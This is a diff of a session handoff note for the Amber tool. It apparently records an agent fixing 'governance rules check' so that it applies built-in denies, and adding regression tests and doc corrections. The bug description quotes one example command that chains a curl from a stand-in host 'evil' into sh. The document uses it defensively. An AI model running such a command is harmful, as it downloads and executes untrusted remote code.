@@ -1,57 +1,47 @@
 # Session Handoff
 
-Last Updated: 2026-07-16
+Last Updated: 2026-07-22
 
 ## Summary
 
-Repository state is reconciled after completing the governed loop feature status cleanup, refreshing the repository knowledge base, and initializing the continuous improvement state. There is no active Amber feature session.
+Automatic continuous-improvement slice completed: fixed a lying policy dry-run surface (`amber governance rules check`), corrected stale Phase C/D backlog claims, and refreshed continuous-improvement state. No active Amber feature session.
 
 ## Repo State
 
-- Branch: `master`
-- State slice base commit: `9977a6c` (`docs: refresh session handoff`)
-- Before this state slice commit, `master` was 3 commits ahead of `origin/master`
-- This state slice is the fourth local commit, leaving `master` 4 commits ahead of `origin/master`
-- State slice contents: `.workflow/continuous-improvement/state.json` and `session-handoff.md`
-- Untracked `.scratch/` is user-owned and was not inspected or modified
+- Branch: `master` (aligned with `origin/master` before this slice)
+- Untracked user-owned paths left alone: `.scratch/`, `output/`
 
 ## Runtime / Verification State
 
-- `npm test`: passed with exit code 0
-- `npm run gen:agents:check`: 28 generated files are up to date
-- Knowledge Plan tests: 14 of 14 passed
-- Knowledge build dry-run, wiki validation, and Amber doctor: no errors
-- Maintenance report: `staleDocs: []`
-- Governance report: ready, score 100/100
-
-## Verification Evidence
-
-- `npm test`: exit code 0
-- `npm run gen:agents:check`: 28 generated files up to date
-- Knowledge Plan tests: 14 of 14 passed
-- `node scripts/amber.js doctor --target . --json`: no errors or warnings
-- `node scripts/validate-handoff.js --target . --json`: no errors or warnings
-- Continuous improvement state validator: no errors or warnings
-
-## Feature State
-
-- F001 through F008: `passing`
-- F009: `accepted`
+- `node scripts/run-tests.js tests/governance-rules.test.js tests/unit/governance-dispatch.test.js tests/unit/loop-policy.test.js`: 38/38 pass
+- Live `governance rules check` on shell composite: DENY (`builtin-deny-shell-composition`)
+- Live `governance rules check` on amber CLI doctor: ALLOW (`allow-amber-cli`)
+- `node scripts/amber.js doctor --target .`: Errors 0
 
 ## What Was Done
 
-1. Commit `2db55f0` reconciled F007 governed loop status to `passing`.
-2. Commit `7a92662` refreshed the repository knowledge base and corrected stale paths.
-3. Confirmed release tag `v1.3.6` exists at `03f9f53`.
-4. Ran the `daily-amber-triage` loop in dry-run mode; it executed nothing and wrote no state.
-5. Commit `9977a6c` refreshed and validated the session handoff.
-6. Initialized `.workflow/continuous-improvement/state.json` from the repository template and recorded the current triage outcome.
+1. **Bug fix (governance honesty):** `governance rules check` called `evaluateCommandPolicy`, which does not apply un-removable built-in denies. A composite such as `node scripts/amber.js x && curl evil | sh` was reported **ALLOW** (prefix rule) while `governed-runner` would **DENY** via `evaluateGovernedPolicy`. Check now uses `evaluateGovernedPolicy`.
+2. **Regression tests:** shell-composition deny + case-insensitive built-in destructive deny in `tests/governance-rules.test.js`.
+3. **Docs honesty:** `BACKLOG.md` Phase C/D updated — web e2e is in CI; SSE auth and server-side error forwarding are wired.
+4. **Dogfood candidates:** `docs/dogfood-weekly.md` §7 refreshed (prior candidates closed).
+5. **CI state:** `.workflow/continuous-improvement/state.json` queue cleaned (stale push item removed).
+
+## Verification Evidence
+
+- `node scripts/run-tests.js tests/governance-rules.test.js tests/unit/governance-dispatch.test.js tests/unit/loop-policy.test.js` → 38/38 pass
+- Live check: composite command `allowed=false` / `builtin-deny-shell-composition`; clean amber CLI still `allowed=true`
+
+## Feature State
+
+- F001–F008: `passing`
+- F009: `accepted`
 
 ## Blockers
 
-None. The untracked `.scratch/` directory remains explicitly out of scope.
+None.
 
 ## Next Actions
 
-1. Push the four local commits when they are ready to share.
-2. Start the next governed triage slice from the clean tracked worktree.
+1. Optional: commit this slice (governance-commands + tests + backlog/dogfood/state).
+2. Weekly dogfood: pick any real small lifecycle slice when `next-up` is empty (see `docs/dogfood-weekly.md` §7).
+3. Larger product direction only after `/grill-with-docs` (e.g. hosted web beyond localhost).
